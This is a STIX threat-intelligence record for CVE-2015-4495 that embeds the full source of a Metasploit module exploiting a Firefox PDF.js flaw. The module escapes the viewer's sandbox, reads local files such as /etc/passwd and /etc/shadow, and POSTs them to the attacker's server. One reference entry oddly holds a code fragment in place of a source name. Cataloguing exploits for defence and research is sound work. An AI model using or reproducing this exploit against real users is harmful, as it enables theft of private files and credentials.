{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--500acff4-6a28-46f4-b9a1-813d18e1be43",
    "created": "2024-08-14T16:31:57.943568Z",
    "modified": "2024-08-14T16:31:57.943572Z",
    "name": "Firefox PDF.js Browser File Theft",
    "description": " This module abuses an XSS vulnerability in versions prior to Firefox 39.0.3, Firefox ESR 38.1.1, and Firefox OS 2.2 that allows arbitrary files to be stolen. The vulnerability occurs in the PDF.js component, which uses Javascript to render a PDF inside a frame with privileges to read local files. The in-the-wild malicious payloads searched for sensitive files on Windows, Linux, and OSX. Android versions are reported to be unaffected, as they do not use the Mozilla PDF viewer. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/firefox_pdfjs_file_theft.rb",
            "external_id": "firefox_pdfjs_file_theft.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.mozilla.org/security/2015/08/06/firefox-exploit-found-in-the-wild/"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-4495"
        },
        {
            "source_name": "x.open(\"POST\"",
            "external_id": "\"#{backend_url}?name=\"+encodeURIComponent(\"%URL%\"));"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => 'Firefox PDF.js Browser File Theft',\n      'Description' => %q{\n        This module abuses an XSS vulnerability in versions prior to Firefox 39.0.3, Firefox ESR\n        38.1.1, and Firefox OS 2.2 that allows arbitrary files to be stolen. The vulnerability\n        occurs in the PDF.js component, which uses Javascript to render a PDF inside a frame with\n        privileges to read local files. The in-the-wild malicious payloads searched for sensitive\n        files on Windows, Linux, and OSX. Android versions are reported to be unaffected, as they\n        do not use the Mozilla PDF viewer.\n      },\n      'Author'         => [\n        'Unknown', # From an 0day served on Russian news website\n        'fukusa',  # Hacker news member that reported the issue\n        'Unknown'  # Metasploit module\n      ],\n      'License'     => MSF_LICENSE,\n      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],\n      'PassiveActions' => [ 'WebServer' ],\n      'References' =>\n        [\n          ['URL', 'https://paste.debian.net/290146'], # 0day exploit\n          ['URL', 'https://news.ycombinator.com/item?id=10021376'], # discussion with discoverer\n          ['URL', 'https://blog.mozilla.org/security/2015/08/06/firefox-exploit-found-in-the-wild/'],\n          ['CVE', '2015-4495']\n        ],\n      'DefaultAction'  => 'WebServer'\n    ))\n\n    register_options([\n      OptString.new('FILES', [\n        false,\n        'Comma-separated list of files to steal',\n        '/etc/passwd, /etc/shadow'\n      ])\n    ])\n\n    register_advanced_options([\n      OptInt.new('PER_FILE_SLEEP', [\n        false,\n        'Milliseconds to wait before attempting to read the frame containing each file',\n        250\n      ])\n    ])\n  end\n\n  def run\n    print_status(\"File targeted for exfiltration: #{JSON.generate(file_urls)}\")\n    exploit\n  end\n\n  def on_request_uri(cli, request)\n    if request.method.downcase == 'post'\n      print_status('Got POST request...')\n      process_post(cli, request)\n      send_response_html(cli, '')\n    else\n      print_status('Sending exploit...')\n      send_response_html(cli, html)\n    end\n  end\n\n  def process_post(cli, req)\n    name = req.qstring['name']\n    print_good(\"Received #{name}, size #{req.body.bytes.length}...\")\n    output = store_loot(\n      name || 'data', 'text/plain', cli.peerhost, req.body, 'firefox_theft', 'Firefox PDF.js exfiltrated file'\n    )\n    print_good(\"Stored to #{output}\")\n  end\n\n  def html\n    exploit_js = js + file_payload + '}, 20);'\n\n    \"<!doctype html><html><body><script>#{exploit_js}</script></body></html>\"\n  end\n\n  def backend_url\n    proto = (datastore['SSL'] ? 'https' : 'http')\n    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : \":#{datastore['SRVPORT']}\"\n    resource = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource\n\n    \"#{proto}://#{my_host}#{port_str}#{resource}/catch\"\n  end\n\n\n  def file_payload\n    %Q|\n      var files = (#{JSON.generate(file_urls)});\n      function next() {\n        var f = files.pop();\n        if (f) {\n          get(\"file://\"+f, function() {\n            var data = get_data(this);\n            var x = new XMLHttpRequest;\n            x.open(\"POST\", \"#{backend_url}?name=\"+encodeURIComponent(\"%URL%\"));\n            x.send(data);\n          }, #{datastore['PER_FILE_SLEEP']}, \"%URL%\", f);\n          setTimeout(next, #{datastore['PER_FILE_SLEEP']}+200);\n        }\n      }\n      next();\n    |\n  end\n\n  def file_urls\n    datastore['FILES'].split(',').map(&:strip)\n  end\n\n  def js\n    <<-EOJS\nfunction xml2string(obj) {\n  return new XMLSerializer().serializeToString(obj);\n}\n\nfunction __proto(obj) {\n  return obj.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__;\n}\n\nfunction get(path, callback, timeout, template, value) {\n  callback = _(callback);\n  if (template && value) {\n    callback = callback.replace(template, value);\n  }\n  js_call1 = 'javascript:' + _(function() {\n    try {\n      open(\"%url%\", \"_self\");\n    } catch (e) {\n      history.back();\n    }\n    undefined;\n  }, \"%url%\", path);\n  js_call2 = 'javascript:;try{updateHidden();}catch(e){};' + callback + ';undefined';\n  sandboxContext(_(function() {\n    i = document.getElementById('i');\n    p = __proto(i.contentDocument.styleSheets[0].ownerNode);\n    i2 = document.getElementById('i2');\n    l = p.__lookupSetter__.call(i2.contentWindow, 'location');\n    l.call(i2.contentWindow, window.wrappedJSObject.js_call1);\n  }));\n  setTimeout((function() {\n    sandboxContext(_(function() {\n      p = __proto(i.contentDocument.styleSheets[0].ownerNode);\n      l = p.__lookupSetter__.call(i2.contentWindow, 'location');\n      l.call(i2.contentWindow, window.wrappedJSObject.js_call2);\n    }));\n  }), timeout);\n}\n\nfunction get_data(obj) {\n  data = null;\n  try {\n    data = obj.document.documentElement.innerHTML;\n    if (data.indexOf('dirListing') < 0) {\n      throw new Error();\n    }\n  } catch (e) {\n    if (this.document instanceof XMLDocument) {\n        data = xml2string(this.document);\n    } else {\n      try {\n          if (this.document.body.firstChild.nodeName.toUpperCase() == 'PRE') {\n              data = this.document.body.firstChild.textContent;\n          } else {\n              throw new Error();\n          }\n      } catch (e) {\n        try {\n          if (this.document.body.baseURI.indexOf('pdf.js') >= 0 || data.indexOf('aboutNetError') > -1) {;\n              return null;\n          } else {\n              throw new Error();\n          }\n        } catch (e) {\n          ;;\n        }\n      }\n    }\n  }\n  return data;\n}\n\nfunction _(s, template, value) {\n  s = s.toString().split(/^\\\\s*function\\\\s+\\\\(\\\\s*\\\\)\\\\s*\\\\{/)[1];\n  s = s.substring(0, s.length - 1);\n  if (template && value) {\n    s = s.replace(template, value);\n  }\n  s += __proto;\n  s += xml2string;\n  s += get_data;\n  s = s.replace(/\\\\s\\\\/\\\\/.*\\\\n/g, \"\");\n  s = s + \";undefined\";\n  return s;\n}\n\nfunction get_sandbox_context() {\n  if (window.my_win_id == null) {\n    for (var i = 0; i < 20; i++) {\n      try {\n        if (window[i].location.toString().indexOf(\"view-source:\") != -1) {\n          my_win_id = i;\n          break;\n        }\n      } catch (e) {}\n    }\n  };\n  if (window.my_win_id == null)\n    return;\n  clearInterval(sandbox_context_i);\n  object.data = 'view-source:' + blobURL;\n  window[my_win_id].location = 'data:application/x-moz-playpreview-pdfjs;,';\n  object.data = 'data:text/html,<'+'html/>';\n  window[my_win_id].frameElement.insertAdjacentHTML('beforebegin', '<iframe style='+\n    '\"position:absolute; left:-9999px;\" onload = \"'+_(function(){\n    window.wrappedJSObject.sandboxContext=(function(cmd) {\n      with(importFunction.constructor('return this')()) {\n        return eval(cmd);\n      }\n    });\n  }) + '\"/>');\n}\n\n\nvar i = document.createElement(\"iframe\");\ni.id = \"i\";\ni.width=i.height=0;\ni.style='position:absolute;left:-9999px;';\ni.src = \"data:application/xml,<?xml version=\\\\\"1.0\\\\\"?><e><e1></e1></e>\";\ndocument.documentElement.appendChild(i);\ni.onload = function() {\n  if (this.contentDocument.styleSheets.length > 0) {\n    var i2 = document.createElement(\"iframe\");\n    i2.id = \"i2\";\n    i2.width=i2.height=0;\n    i2.style='position:absolute;left:-9999px;';\n    i2.src = \"data:application/pdf,\";\n    document.documentElement.appendChild(i2);\n    pdfBlob = new Blob([''], {\n        type: 'application/pdf'\n    });\n    blobURL = URL.createObjectURL(pdfBlob);\n    object = document.createElement('object');\n    object.data = 'data:application/pdf,';\n    object.onload = (function() {\n        sandbox_context_i = setInterval(get_sandbox_context, 200);\n        object.onload = null;\n        object.data = 'view-source:' + location.href;\n        return;\n    });\n    document.documentElement.appendChild(object);\n  } else {\n    this.contentWindow.location.reload();\n  }\n}\n\nvar kill = setInterval(function() {\n  if (window.sandboxContext) {\n    clearInterval(kill);\n  } else {\n    return;\n  }\nEOJS\n  end\nend\n"
}